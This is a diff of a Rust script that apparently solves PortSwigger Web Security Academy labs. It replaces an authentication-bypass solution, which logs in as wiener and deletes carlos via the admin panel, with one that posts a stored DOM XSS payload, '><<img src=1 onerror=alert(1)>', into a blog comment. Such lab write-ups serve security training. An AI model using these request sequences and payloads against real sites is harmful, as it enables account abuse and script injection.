@@ -1,17 +1,16 @@
-/**********************************************************************************
+/********************************************************************************
 *
 * Author: Ahmed Elqalaawy (@elqal3awii)
 *
-* Date: 28/10/2023
+* Date: 20/11/2023
 *
-* Lab: Authentication bypass via flawed state machine
+* Lab: Stored DOM XSS
 *
-* Steps: 1. Fetch the login page
-*        2. Extract the csrf token and session cookie to login
-*        3. Login as wiener
-*        4. Delete carlos from the admin panel directly without selecting a role
+* Steps: 1. Fetch a post page
+*        2. Extract the session cookie and the csrf token to post a comment
+*        3. Post a comment with the injected payload in the comment field
 *
-***********************************************************************************/
+*********************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -35,72 +34,72 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a41009e031b2312823c0c9b00630026.web-security-academy.net";
+    let url = "https://0a6200c00431f146825e0d4000e10002.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
+    print!("{}", "⦗1⦘ Fetching a post page.. ".white());
     io::stdout().flush();
 
-    // fetch the login page
-    let login_page = client
-        .get(format!("{url}/login"))
+    // fetch a post page
+    let post_page = client
+        .get(format!("{url}/post?postId=1"))
         .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
+        .expect(&format!("{}", "[!] Failed to fetch a post page".red()));
 
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗2⦘ Extracting the csrf token and session cookie to login.. ".white(),
+        "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ".white(),
     );
     io::stdout().flush();
 
     // extract session cookie
-    let mut session = extract_session_cookie(login_page.headers())
+    let session = extract_session_cookie(post_page.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // extract the csrf token
-    let mut csrf =
-        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
-    io::stdout().flush();
-
-    // login as wiener
-    let login = client
-        .post(format!("{url}/login"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("username", "wiener"),
-            ("password", "peter"),
-            ("csrf", &csrf),
-        ]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to login as wiener".red()));
-
-    // extract session cookie of wiener
-    session = extract_session_cookie(login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+    // extract the csrf token to post a comment
+    let mut csrf = extract_csrf(post_page).expect(&format!(
+        "{}",
+        "[!] Failed to extract csrf to post a comment".red()
+    ));
 
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗4⦘ Deleting carlos from the admin panel directly without selecting a role.. ".white(),
+        "⦗3⦘ Posting a comment with the injected payload in the comment field.. ".white(),
     );
     io::stdout().flush();
 
-    // delete carlos directly since you have the session cookie and didn't select a role
-    // you don't have to fetch the admin panel first
-    // when you don't select a role, the default will be an administrator
+    // payload to call the alert function
+    let payload = "><<img src=1 onerror=alert(1)>";
+
+    // post a comment with the injected payload in the comment field
     client
-        .get(format!("{url}/admin/delete?username=carlos"))
+        .post(format!("{url}/post/comment"))
         .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("postId", "1"),
+            ("name", "Hacker"),
+            ("email", "hack@me.com"),
+            ("comment", payload),
+            ("csrf", &csrf),
+        ]))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to delete carlos from the admin panel".red()
+            "[!] Failed to post a comment with the injected payload in the comment field".red()
+        ));
+
+    // fetch the post page with the injected payload
+    // this request is just for marking the lab as solved
+    client
+        .get(format!("{url}/post?postId=1"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the post page with the injected payload".red()
         ));
 
     println!("{}", "OK".green());
@@ -117,22 +116,10 @@ fn main() {
 ********************************************************************/
 fn build_client() -> Client {
     ClientBuilder::new()
-        .redirect(Policy::none())
+        .redirect(Policy::default())
         .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
-}
-
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
 }
 
 /*************************************************
@@ -156,6 +143,18 @@ fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
     let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
     if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
         Some(session.as_str().to_string())
+    } else {
+        None
+    }
+}
+
+/********************************************
+* Function to capture a pattern form a text
+*********************************************/
+fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
+    let pattern = Regex::new(pattern).unwrap();
+    if let Some(text) = pattern.captures(text) {
+        Some(text.get(1).unwrap().as_str().to_string())
     } else {
         None
     }
